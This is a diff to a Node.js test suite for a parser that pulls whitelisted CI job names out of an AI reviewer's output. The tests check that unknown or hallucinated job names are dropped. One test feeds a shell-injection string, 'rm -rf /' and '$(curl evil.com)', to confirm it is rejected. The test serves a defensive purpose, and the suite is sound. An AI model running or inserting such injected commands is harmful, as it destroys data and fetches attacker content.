@@ -1,13 +1,30 @@
 import { test } from "node:test";
 import assert from "node:assert/strict";
-import { extractVerdict, extractFilesReviewed, decideVerdict } from "./review-verdict.mjs";
+import {
+  extractVerdict,
+  extractFilesReviewed,
+  extractForceRunJobs,
+  decideVerdict,
+} from "./review-verdict.mjs";
 
-const clean = (verdict) => `## Findings
+const ALLOWED_JOBS = [
+  "audit",
+  "test-api-unit",
+  "test-api-e2e",
+  "test-web",
+  "perf-budget",
+  "load-test",
+];
+
+const clean = (verdict, forceRun = "none") => `## Findings
 No issues found.
 
 ## Files reviewed
 foo.tsx
 bar.ts
+
+## Force-run jobs
+${forceRun}
 
 ## Verdict
 ${verdict}`;
@@ -95,6 +112,71 @@ APPROVE`;
 
 test("extractFilesReviewed: no heading returns empty list", () => {
   assert.deepEqual(extractFilesReviewed("## Findings\nNothing here."), []);
+});
+
+// A Force-run jobs section sitting between Files reviewed and Verdict
+// must not leak into the files list — this was a real gap the redesign
+// closed: the old "stop only at ## Verdict" logic would have swallowed
+// it whole.
+test("extractFilesReviewed: does not swallow a Force-run jobs section that follows it", () => {
+  const text = `## Files reviewed
+foo.tsx
+
+## Force-run jobs
+test-api-e2e
+
+## Verdict
+REQUEST_CHANGES`;
+  assert.deepEqual(extractFilesReviewed(text), ["foo.tsx"]);
+});
+
+test("extractForceRunJobs: 'none' returns empty list", () => {
+  assert.deepEqual(extractForceRunJobs(clean("APPROVE", "none"), ALLOWED_JOBS), []);
+});
+
+test("extractForceRunJobs: valid comma-separated job IDs", () => {
+  const result = extractForceRunJobs(
+    clean("REQUEST_CHANGES", "test-api-e2e, load-test"),
+    ALLOWED_JOBS,
+  );
+  assert.deepEqual(result, ["test-api-e2e", "load-test"]);
+});
+
+test("extractForceRunJobs: hallucinated/unknown job names are dropped", () => {
+  const result = extractForceRunJobs(
+    clean("REQUEST_CHANGES", "test-api-e2e, some-made-up-job, lint"),
+    ALLOWED_JOBS,
+  );
+  assert.deepEqual(result, ["test-api-e2e"]);
+});
+
+// The list ends up interpolated into a `gh workflow run` shell command
+// downstream — this is the actual security boundary, not just tidiness.
+// Exact-match-only against the whitelist means a malformed token is
+// rejected as a whole, not partially salvaged — "test-api-e2e; rm -rf /"
+// as one comma-separated token doesn't equal "test-api-e2e" and produces
+// nothing, rather than extracting the valid-looking prefix.
+test("extractForceRunJobs: shell-injection-shaped input produces nothing, not a partial extraction", () => {
+  const result = extractForceRunJobs(
+    clean("REQUEST_CHANGES", "test-api-e2e; rm -rf /, $(curl evil.com)"),
+    ALLOWED_JOBS,
+  );
+  assert.deepEqual(result, []);
+});
+
+test("extractForceRunJobs: duplicates are deduplicated", () => {
+  const result = extractForceRunJobs(
+    clean("REQUEST_CHANGES", "load-test, load-test, audit"),
+    ALLOWED_JOBS,
+  );
+  assert.deepEqual(result, ["load-test", "audit"]);
+});
+
+test("extractForceRunJobs: missing section returns empty list", () => {
+  assert.deepEqual(
+    extractForceRunJobs("## Findings\nNothing here.", ALLOWED_JOBS),
+    [],
+  );
 });
 
 test("decideVerdict: clean APPROVE with matching files", () => {
